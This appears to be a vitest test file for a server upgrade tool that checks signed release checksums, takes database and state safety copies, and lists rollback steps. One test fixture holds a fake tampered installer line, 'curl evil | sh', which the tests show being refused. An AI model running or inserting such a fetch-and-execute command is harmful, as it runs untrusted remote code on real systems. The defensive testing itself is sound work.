import { describe, expect, it } from 'vitest'
import { generateKeyPairSync, sign } from 'node:crypto'
import { AGE_REPAIR_SQL } from './age-repair.ts'
import { sha256Hex } from './release-key.ts'
import { latestTarball, releaseOf, RELEASES_URL, rollbackSteps, upgrade, type UpgradeDeps } from './upgrade.ts'

const LATEST = 'eigenenterprise-0.4.0-1bb02b405565'

// A throwaway release key (never a real one in the repo).
const KEY = generateKeyPairSync('ed25519')
const KEY_PEM = KEY.publicKey.export({ type: 'spki', format: 'pem' }).toString()
const INSTALL_SH = '#!/bin/sh\necho install\n'
const SUMS = `${sha256Hex(`${LATEST}\n`)}  LATEST\n${sha256Hex(INSTALL_SH)}  install.sh\n`
const SIG = sign(null, Buffer.from(SUMS), KEY.privateKey).toString('base64')

function fake(
  opts: { current?: string | null; latest?: string; upgradesDir?: string[]; sums?: string; sig?: string; installSh?: string } = {},
  over: Partial<UpgradeDeps> = {},
) {
  const calls: string[] = []
  const logs: string[] = []
  const dirs = [...(opts.upgradesDir ?? [])]
  const files = new Map<string, string>()
  const deps: UpgradeDeps = {
    fetchText: async (url) => {
      calls.push(`fetch ${url}`)
      if (url.endsWith('/SHA256SUMS')) return opts.sums ?? SUMS
      if (url.endsWith('/SHA256SUMS.sig')) return `${opts.sig ?? SIG}\n`
      return `${opts.latest ?? LATEST}\n`
    },
    download: async (url, dest) => {
      calls.push(`download ${url} -> ${dest}`)
      files.set(dest, opts.installSh ?? INSTALL_SH)
    },
    sha256File: async (p) => sha256Hex(files.get(p) ?? ''),
    releaseKeyPem: KEY_PEM,
    run: async (cmd, args) => {
      calls.push(`run ${cmd} ${args.join(' ')}`)
      return { code: 0, stderr: '' }
    },
    runLive: async (cmd, args) => {
      calls.push(`live ${cmd} ${args.join(' ')}`)
      return 0
    },
    installed: async () => (opts.current === undefined ? 'eigenenterprise-0.3.0-2eb55cbca54c-linux-arm64.tar.gz' : opts.current),
    listUpgrades: async () => [...dirs],
    mkdirp: async (p) => void calls.push(`mkdir ${p}`),
    writeFile: async (p) => void calls.push(`write ${p}`),
    remove: async (p) => void calls.push(`remove ${p}`),
    now: () => new Date('2026-11-10T15:30:00Z'),
    log: (l) => void logs.push(l),
    ...over,
  }
  return { deps, calls, logs }
}

describe('latestTarball', () => {
  it("names this server's CPU's tarball from the release's LATEST", async () => {
    const { deps, calls } = fake()
    expect(await latestTarball(deps, RELEASES_URL, 'arm64')).toBe(`${LATEST}-linux-arm64.tar.gz`)
    expect(await latestTarball(deps, RELEASES_URL, 'x64')).toBe(`${LATEST}-linux-x64.tar.gz`)
    expect(calls[0]).toBe(`fetch ${RELEASES_URL}/LATEST`)
  })

  it('refuses a LATEST that is not a release name', async () => {
    const { deps } = fake({ latest: '<html>Not Found</html>' })
    await expect(latestTarball(deps, RELEASES_URL, 'arm64')).rejects.toThrow(/not a release name/)
  })
})

describe('upgrade', () => {
  it('does nothing when the server already runs the latest release', async () => {
    const { deps, calls, logs } = fake({ current: `${LATEST}-linux-arm64.tar.gz` })
    expect(await upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).toBe('up-to-date')
    expect(calls.filter((c) => !c.startsWith('fetch'))).toEqual([])
    expect(logs.join('\n')).toMatch(/already runs .*0\.4\.0/)
  })

  it('--check only reports what would be installed', async () => {
    const { deps, calls, logs } = fake()
    expect(await upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: true })).toBe('available')
    expect(calls.filter((c) => !c.startsWith('fetch'))).toEqual([])
    expect(logs.join('\n')).toContain(`${LATEST}-linux-arm64.tar.gz`)
  })

  it('takes a safety copy (database + ee state) before installing, then runs the release installer', async () => {
    const { deps, calls } = fake()
    expect(await upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).toBe('upgraded')
    const dir = '/var/lib/ee/upgrades/2026-11-10T15-30-00Z'
    expect(calls).toEqual([
      `fetch ${RELEASES_URL}/LATEST`,
      `fetch ${RELEASES_URL}/SHA256SUMS`,
      `fetch ${RELEASES_URL}/SHA256SUMS.sig`,
      `mkdir ${dir}`,
      `run sh -c runuser -u postgres -- pg_dump -Fc os > '${dir}/os.dump'`,
      `run tar -czf ${dir}/ee-state.tgz -C / var/lib/ee/company var/lib/ee/secrets.enc etc/ee`,
      `write ${dir}/ROLLBACK.txt`,
      `download ${RELEASES_URL}/install.sh -> ${dir}/install.sh`,
      `live sh ${dir}/install.sh --from ${RELEASES_URL}`,
    ])
  })

  it('passes --node-ip through to the installer (an upgrade to calls names it once)', async () => {
    const { deps, calls } = fake()
    await upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false, nodeIp: '203.0.113.7' })
    expect(calls.at(-1)).toBe(`live sh /var/lib/ee/upgrades/2026-11-10T15-30-00Z/install.sh --from ${RELEASES_URL} --node-ip 203.0.113.7`)
  })

  it('stops before touching anything when the safety copy fails', async () => {
    const { deps, calls } = fake({}, {
      run: async (cmd, args) => (args.join(' ').includes('pg_dump') ? { code: 1, stderr: 'pg_dump: connection refused' } : { code: 0, stderr: '' }),
    })
    await expect(upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).rejects.toThrow(
      /safety copy failed.*connection refused/,
    )
    expect(calls.some((c) => c.startsWith('download') || c.startsWith('live'))).toBe(false)
  })

  const touched = (calls: string[]) => calls.filter((c) => /^(mkdir|run|write|live)/.test(c))

  it('refuses a release whose SHA256SUMS is not signed by the release key, before touching anything', async () => {
    const other = generateKeyPairSync('ed25519').privateKey
    const { deps, calls } = fake({ sig: sign(null, Buffer.from(SUMS), other).toString('base64') })
    await expect(upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).rejects.toThrow(
      /upgrade refused, nothing changed: .*not signed by the eigenEnterprise release key/,
    )
    expect(touched(calls)).toEqual([])
    expect(calls.some((c) => c.startsWith('download'))).toBe(false)
  })

  it('refuses a tampered SHA256SUMS', async () => {
    const { deps, calls } = fake({ sums: SUMS.replace(sha256Hex(INSTALL_SH), sha256Hex('evil')) })
    await expect(upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).rejects.toThrow(/not signed/)
    expect(touched(calls)).toEqual([])
  })

  it('never runs an install.sh that is not the signed one', async () => {
    const { deps, calls } = fake({ installSh: '#!/bin/sh\ncurl evil | sh\n' })
    await expect(upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).rejects.toThrow(
      /upgrade refused, nothing changed: checksum mismatch for install.sh/,
    )
    expect(calls.some((c) => c.startsWith('live'))).toBe(false)
    expect(calls).toContain('remove /var/lib/ee/upgrades/2026-11-10T15-30-00Z/install.sh')
  })

  it('refuses a signed manifest that does not list install.sh', async () => {
    const sums = `${sha256Hex(`${LATEST}\n`)}  LATEST\n`
    const { deps, calls } = fake({ sums, sig: sign(null, Buffer.from(sums), KEY.privateKey).toString('base64') })
    await expect(upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).rejects.toThrow(/does not list install.sh/)
    expect(calls.some((c) => c.startsWith('live'))).toBe(false)
  })

  it('fails loud on a build without a release key', async () => {
    const { deps, calls } = fake({}, { releaseKeyPem: 'PLACEHOLDER: no release signing key yet' })
    await expect(upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).rejects.toThrow(
      'this build has no release signing key (run scripts/release-key.sh)',
    )
    expect(touched(calls)).toEqual([])
  })

  it('reports a failed installer with where the safety copy is', async () => {
    const { deps } = fake({}, { runLive: async () => 1 })
    await expect(upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })).rejects.toThrow(
      /installer failed.*\/var\/lib\/ee\/upgrades\/2026-11-10T15-30-00Z\/ROLLBACK\.txt/,
    )
  })

  it('keeps the three newest safety copies', async () => {
    const { deps, calls } = fake({
      upgradesDir: ['2026-10-01T00-00-00Z', '2026-10-02T00-00-00Z', '2026-10-03T00-00-00Z', '2026-10-04T00-00-00Z'],
    })
    await upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false })
    expect(calls.filter((c) => c.startsWith('remove'))).toEqual([
      'remove /var/lib/ee/upgrades/2026-10-01T00-00-00Z',
      'remove /var/lib/ee/upgrades/2026-10-02T00-00-00Z',
    ])
  })
})

describe('rollbackSteps', () => {
  it('restores the database, repairs the AGE graph ids, restores ee state and restarts ee', () => {
    const steps = rollbackSteps('/var/lib/ee/upgrades/2026-11-10T15-30-00Z')
    const order = ['systemctl stop ee.service', 'tar -xzf', 'dropdb os', 'pg_restore --create', AGE_REPAIR_SQL, 'systemctl start ee.service']
    const at = order.map((s) => steps.indexOf(s))
    expect(at.every((i) => i >= 0)).toBe(true)
    expect([...at].sort((a, b) => a - b)).toEqual(at)
  })
})

describe('upgrade from Settings → Updates (pinned to the approved release, steps reported)', () => {
  it('refuses a release other than the approved one before anything changes', async () => {
    const { deps, calls } = fake()
    await expect(
      upgrade(deps, { from: RELEASES_URL, arch: 'arm64', check: false, expect: 'eigenenterprise-0.4.1-aaaaaaaaaaaa' }),
    ).rejects.toThrow(/nothing changed: .* holds eigenenterprise-0\.4\.0-1bb02b405565-linux-arm64\.tar\.gz, not the approved eigenenterprise-0\.4\.1/)
    expect(calls.filter((c) => !c.startsWith('fetch'))).toEqual([])
  })

  it('reports verifying, safety-copy (with its directory) and installing, in order', async () => {
    const { deps } = fake()
    const steps: string[] = []
    expect(
      await upgrade(deps, {
        from: RELEASES_URL,
        arch: 'arm64',
        check: false,
        expect: LATEST,
        onStep: async (s, detail) => void steps.push(`${s} ${detail}`),
      }),
    ).toBe('upgraded')
    expect(steps).toEqual([
      `verifying ${RELEASES_URL}`,
      'safety-copy /var/lib/ee/upgrades/2026-11-10T15-30-00Z',
      'installing /var/lib/ee/upgrades/2026-11-10T15-30-00Z',
    ])
  })
})

describe('releaseOf: the release a name refers to, on any CPU', () => {
  it('a release name is itself; each CPU tarball of it names the same release', () => {
    expect(releaseOf('eigenenterprise-0.5.19-e7df63979e8e')).toBe('eigenenterprise-0.5.19-e7df63979e8e')
    expect(releaseOf('eigenenterprise-0.5.19-e7df63979e8e-linux-x64.tar.gz')).toBe('eigenenterprise-0.5.19-e7df63979e8e')
    expect(releaseOf('eigenenterprise-0.5.19-e7df63979e8e-linux-arm64.tar.gz')).toBe('eigenenterprise-0.5.19-e7df63979e8e')
  })
  it('anything else is no release', () => {
    for (const n of ['latest', 'eigenenterprise-0.5.19-e7df63979e8e-linux-riscv.tar.gz', 'livekit-server-1.13.11-linux-x64.tar.gz', '']) expect(releaseOf(n)).toBeNull()
  })
})
